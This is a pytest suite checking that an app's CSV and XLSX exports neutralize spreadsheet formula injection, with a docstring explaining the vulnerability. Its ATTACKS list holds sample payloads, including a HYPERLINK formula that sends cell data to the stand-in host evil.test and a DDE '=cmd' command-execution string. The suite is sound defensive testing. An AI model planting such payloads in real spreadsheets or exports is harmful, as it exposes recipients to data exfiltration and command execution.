"""Spreadsheet formula injection (CWE-1236) in generated CSV/XLSX exports.

Tenant text reaches every export verbatim. Excel evaluates a cell whose text
starts with ``=``/``+``/``-``/``@``/TAB/CR as a formula when it opens the file,
and openpyxl writes a leading-``=`` string into a real ``<f>`` element -- so
``=HYPERLINK("http://evil.test/?d="&A1,"CLICK")`` stored in a part description
became a live exfiltration link in the recipient's spreadsheet.

The two formats are fixed differently and the tests hold each to its own bar:

* XLSX is fixed NON-DESTRUCTIVELY (``data_type = "s"``), so the assertions are
  the strong ones: the raw ``xl/worksheets/sheet1.xml`` contains **no ``<f>``
  element** and every value round-trips **byte-exact**.
* CSV has no type system, so the only fix is a ``'`` prefix -- lossy on the
  artifact. The assertions therefore pin *both* that dangerous values are
  neutralized *and* that the collateral is bounded: plain numbers, ordinary
  text and RFC 4180 quoting are untouched.
"""

import csv
import io
import re
import zipfile
from datetime import date, datetime
from decimal import Decimal

import pytest
from openpyxl import Workbook, load_workbook

from app.services.export_safety import (
    append_row,
    force_text_cell,
    harden_workbook,
    is_formula_initiating,
    sanitize_csv_mapping,
    sanitize_csv_row,
    sanitize_csv_value,
    write_cell,
)
from app.services.export_service import generate_csv, generate_excel

pytestmark = pytest.mark.unit

# Payloads a spreadsheet would execute on open.
ATTACKS = [
    '=HYPERLINK("http://evil.test/?d="&A1,"CLICK")',
    "=cmd|'/c calc'!A1",
    "@SUM(1+1)",
    "+1+1",
    "-1+1",
    "\t=1+1",
    "\r=1+1",
    "=",
]

# Real shop values that happen to start with a formula-initiating character, or
# that must survive an export untouched. None of these may be mangled.
LEGITIMATE = [
    "+1-555-0134",
    "-0.005 TIR",
    "- check bore per print",
    "@rev A",
    "WRC-1234",
    "0.125 THK",
    "",
]

# Strings that *are* just numbers: CSV must leave these usable as numbers.
NUMERIC_STRINGS = ["-5.00", "-0.005", "+1e3", "-42", "+0"]


def _sheet_xml(blob: bytes) -> str:
    with zipfile.ZipFile(io.BytesIO(blob)) as archive:
        return archive.read("xl/worksheets/sheet1.xml").decode("utf-8")


def _formula_elements(xml: str) -> list:
    return re.findall(r"<f[ >/]", xml)


# ---------------------------------------------------------------------------
# Helper unit tests
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", ATTACKS)
def test_is_formula_initiating_flags_every_dangerous_prefix(payload):
    assert is_formula_initiating(payload) is True


@pytest.mark.parametrize("value", ["WRC-1234", "", "0.125 THK", None, 5, -5.0, True])
def test_is_formula_initiating_ignores_safe_and_non_string_values(value):
    assert is_formula_initiating(value) is False


@pytest.mark.parametrize("payload", ATTACKS)
def test_sanitize_csv_value_prefixes_dangerous_strings(payload):
    out = sanitize_csv_value(payload)
    assert out == "'" + payload, "prefix must be added without altering the rest of the value"


@pytest.mark.parametrize("value", NUMERIC_STRINGS)
def test_sanitize_csv_value_leaves_plain_numbers_alone(value):
    """Bounded collateral: a signed number is not a formula, and prefixing it would
    hand the recipient text where they expect a number."""
    assert sanitize_csv_value(value) == value


@pytest.mark.parametrize("value", ["WRC-1234", "0.125 THK", "", None, 5, -5.0, Decimal("-5.00"), True])
def test_sanitize_csv_value_passes_through_safe_and_non_string_values(value):
    assert sanitize_csv_value(value) == value


def test_sanitize_csv_value_still_prefixes_non_finite_lookalikes():
    """``-inf``/``-nan`` are not numbers a spreadsheet can use, so they take the
    normal neutralization path rather than the number exemption."""
    assert sanitize_csv_value("-inf") == "'-inf"
    assert sanitize_csv_value("-nan") == "'-nan"


def test_sanitize_csv_row_and_mapping():
    assert sanitize_csv_row(["=A1", "ok", 5]) == ["'=A1", "ok", 5]
    assert sanitize_csv_mapping({"a": "=A1", "b": "ok"}) == {"a": "'=A1", "b": "ok"}


def test_sanitize_csv_mapping_preserves_keys_for_dictwriter():
    """DictWriter matches keys against fieldnames -- sanitizing a key would raise
    ValueError('dict contains fields not in fieldnames')."""
    assert list(sanitize_csv_mapping({"=danger": 1, "b": 2})) == ["=danger", "b"]


# ---------------------------------------------------------------------------
# XLSX: the non-destructive fix, proven at the XML level
# ---------------------------------------------------------------------------


def test_raw_openpyxl_writes_a_formula_element_without_the_fix():
    """Pins the vulnerability itself: assigning the string is what creates ``<f>``.
    If openpyxl ever stops doing this the fix is still correct, but this test
    tells us the threat model changed."""
    workbook = Workbook()
    workbook.active.cell(row=1, column=1, value='=HYPERLINK("http://evil.test",A1)')
    buffer = io.BytesIO()
    workbook.save(buffer)
    assert _formula_elements(_sheet_xml(buffer.getvalue())), "expected the vulnerable <f> element"


def test_force_text_cell_removes_the_formula_element_and_keeps_the_bytes():
    payload = '=HYPERLINK("http://evil.test",A1)'
    workbook = Workbook()
    force_text_cell(workbook.active.cell(row=1, column=1, value=payload))
    buffer = io.BytesIO()
    workbook.save(buffer)
    xml = _sheet_xml(buffer.getvalue())

    assert _formula_elements(xml) == []
    assert 't="inlineStr"' in xml
    assert load_workbook(io.BytesIO(buffer.getvalue())).active["A1"].value == payload


def test_force_text_cell_leaves_numbers_and_dates_native():
    workbook = Workbook()
    sheet = workbook.active
    numeric = force_text_cell(sheet.cell(row=1, column=1, value=-5.0))
    dated = force_text_cell(sheet.cell(row=1, column=2, value=datetime(2026, 7, 30, 9, 0)))
    empty = force_text_cell(sheet.cell(row=1, column=3, value=None))

    assert numeric.data_type == "n" and numeric.value == -5.0
    assert dated.data_type == "d" and dated.value == datetime(2026, 7, 30, 9, 0)
    assert empty.data_type == "n" and empty.value is None


def test_write_cell_and_append_row_both_neutralize():
    payload = "=cmd|'/c calc'!A1"
    workbook = Workbook()
    sheet = workbook.active
    write_cell(sheet, 1, 1, payload)
    append_row(sheet, [payload, 12.5, None])
    buffer = io.BytesIO()
    workbook.save(buffer)

    assert _formula_elements(_sheet_xml(buffer.getvalue())) == []
    reread = load_workbook(io.BytesIO(buffer.getvalue())).active
    assert reread["A1"].value == payload
    assert reread["A2"].value == payload
    assert reread["B2"].value == 12.5


def test_harden_workbook_covers_every_sheet():
    payload = "=1+1"
    workbook = Workbook()
    workbook.active.append([payload])
    workbook.create_sheet("Second").append([payload])
    harden_workbook(workbook)
    buffer = io.BytesIO()
    workbook.save(buffer)

    with zipfile.ZipFile(io.BytesIO(buffer.getvalue())) as archive:
        sheets = [n for n in archive.namelist() if n.startswith("xl/worksheets/")]
        assert len(sheets) == 2
        for name in sheets:
            assert _formula_elements(archive.read(name).decode("utf-8")) == []


@pytest.mark.parametrize("payload", ATTACKS)
def test_generate_excel_writes_attacks_as_string_cells(payload):
    """End-to-end through the real exporter: string cell, byte-exact, no ``<f>``."""
    blob = generate_excel([{"text": payload}], ["text"], "Export")

    assert _formula_elements(_sheet_xml(blob)) == [], "a formula element survived the export"
    cell = load_workbook(io.BytesIO(blob))["Export"].cell(row=2, column=1)
    assert cell.data_type == "s", f"{payload!r} must be a string cell, got data_type={cell.data_type!r}"
    assert cell.value == payload, "the value must be preserved byte-for-byte -- no prefixing in XLSX"


@pytest.mark.parametrize("value", LEGITIMATE + NUMERIC_STRINGS)
def test_generate_excel_preserves_legitimate_text_unchanged(value):
    blob = generate_excel([{"text": value}], ["text"], "Export")
    cell = load_workbook(io.BytesIO(blob))["Export"].cell(row=2, column=1)
    # openpyxl round-trips the empty string as an empty inline-string cell (None
    # on read-back) -- pre-existing behavior, unrelated to the neutralization.
    assert cell.value == (value if value != "" else None)


def test_generate_excel_keeps_real_numbers_and_dates_typed():
    """The fix must not turn the whole sheet into text: only ``str`` cells are pinned."""
    row = {
        "money": Decimal("-5.00"),
        "qty": 42,
        "tolerance": -0.005,
        "when": datetime(2026, 7, 30, 13, 45),
        "day": date(2026, 7, 30),
        "missing": None,
    }
    blob = generate_excel([row], list(row), "Export")
    sheet = load_workbook(io.BytesIO(blob))["Export"]

    assert [sheet.cell(row=2, column=i).data_type for i in (1, 2, 3)] == ["n", "n", "n"]
    assert sheet.cell(row=2, column=1).value == -5.0
    assert sheet.cell(row=2, column=3).value == -0.005
    # format_value stringifies datetimes/dates before they reach the cell.
    assert sheet.cell(row=2, column=4).value == "2026-07-30 13:45:00"
    assert sheet.cell(row=2, column=5).value == "2026-07-30"
    assert sheet.cell(row=2, column=6).value is None


def test_generate_excel_neutralizes_the_caller_supplied_header_row():
    """``columns`` is a request query param on every /export endpoint, so the header
    row carries caller input too."""
    payload = "=HYPERLINK(1)"
    blob = generate_excel([{payload: "x"}], [payload], "Export")

    assert _formula_elements(_sheet_xml(blob)) == []
    assert load_workbook(io.BytesIO(blob))["Export"].cell(row=1, column=1).data_type == "s"


# ---------------------------------------------------------------------------
# CSV: neutralized, with bounded collateral
# ---------------------------------------------------------------------------


def _csv_cells(payloads):
    body = generate_csv([{"v": p} for p in payloads], ["v"])
    return [row[0] for row in csv.reader(io.StringIO(body))][1:]


@pytest.mark.parametrize("payload", ATTACKS)
def test_generate_csv_neutralizes_attacks(payload):
    assert _csv_cells([payload]) == ["'" + payload]


@pytest.mark.parametrize("value", LEGITIMATE)
def test_generate_csv_only_prefixes_when_the_value_is_formula_initiating(value):
    expected = "'" + value if is_formula_initiating(value) and value not in NUMERIC_STRINGS else value
    assert _csv_cells([value]) == [expected]


def test_generate_csv_leaves_numbers_usable():
    """Numeric strings AND real numerics come out unprefixed, so the recipient can
    still sum the column."""
    assert _csv_cells(NUMERIC_STRINGS) == NUMERIC_STRINGS
    # format_value casts Decimal -> float, hence "-5.0"; the point is the absent prefix.
    assert _csv_cells([Decimal("-5.00"), -0.005, 42]) == ["-5.0", "-0.005", "42"]


def test_generate_csv_preserves_rfc4180_quoting():
    values = ['has,comma "and" quote', "line1\nline2", "=EVIL(),x", 'plain']
    body = generate_csv([{"v": v} for v in values], ["v"])
    parsed = [row[0] for row in csv.reader(io.StringIO(body))][1:]

    assert parsed == ['has,comma "and" quote', "line1\nline2", "'=EVIL(),x", "plain"]
    assert '"has,comma ""and"" quote"' in body, "quoting must still be applied by csv.writer"


def test_generate_csv_neutralizes_the_caller_supplied_header_row():
    body = generate_csv([{"=danger": "x"}], ["=danger"])
    assert body.splitlines()[0] == "'=danger"
